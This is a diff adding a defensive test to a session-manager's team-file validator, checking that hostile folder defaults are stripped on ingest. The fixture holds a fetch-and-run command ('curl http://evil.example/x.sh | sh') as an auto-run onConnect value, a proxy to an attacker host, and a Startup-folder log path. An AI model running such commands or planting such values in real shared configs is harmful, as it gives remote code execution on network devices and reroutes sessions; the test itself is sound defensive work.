@@ -287,4 +287,49 @@ const tree = (...nodes) => Object.fromEntries(nodes.map((n) => [n.id, n]));
         'defaults.onConnect must never be published to a shared file');
 }
 
-console.log('ok - team merge + serializer (18 scenarios: matrix, whitelist, cycle repair, field validation, id-field guard, snippets)');
+// ...and the side that actually meets a hostile file. The strip above is on
+// the PUBLISH path; a file arriving off the share meets validateTeamFile,
+// which used to pass `defaults` through untouched. A folder's defaults reach
+// every session beneath them through the inheritance walk, so that object is
+// the highest-value thing in a hostile file:
+//   onConnect is auto-typed into every session on every connect - remote
+//   command execution on the reader's own gear.
+//   proxy silently routes every session in the folder through a host the
+//   file chose.
+// The Added group in the merge preview renders name and host, so a new
+// folder called "Core Switches" carrying a payload looked like nothing but
+// the words Core Switches. Whitelist on ingest.
+{
+    const hostile = validateTeamFile({
+        schema: 1, rev: 1,
+        nodes: {
+            f1: {
+                id: 'f1', type: 'folder', name: 'Core Switches', parentId: null,
+                defaults: {
+                    onConnect: 'curl http://evil.example/x.sh | sh',
+                    proxy: 'socks5://evil.example:1080',
+                    credentialProfile: 'AD',
+                    port: 22,
+                    logging: { enabled: true, folder: 'C:\\Users\\me\\Startup' },
+                },
+            },
+        },
+    });
+    const d = hostile.nodes.f1.defaults;
+    assert.ok(!('onConnect' in d),
+        'defaults.onConnect must not survive ingest - it types into live devices');
+    assert.ok(!('proxy' in d),
+        'defaults.proxy must not survive ingest - it decides where sessions dial through');
+    assert.strictEqual(d.credentialProfile, 'AD', 'ordinary defaults still arrive');
+    assert.strictEqual(d.port, 22);
+    assert.ok(!('folder' in d.logging),
+        'a log folder inside defaults is stripped like the per-session one');
+    // A defaults that is not an object at all must not reach the tree.
+    const junk = validateTeamFile({
+        schema: 1, rev: 1,
+        nodes: { f2: { id: 'f2', type: 'folder', name: 'x', defaults: ['nope'] } },
+    });
+    assert.ok(junk.nodes.f2.defaults === undefined, 'a non-object defaults is dropped');
+}
+
+console.log('ok - team merge + serializer (19 scenarios: matrix, whitelist, cycle repair, field validation, id-field guard, snippets, hostile folder defaults)');
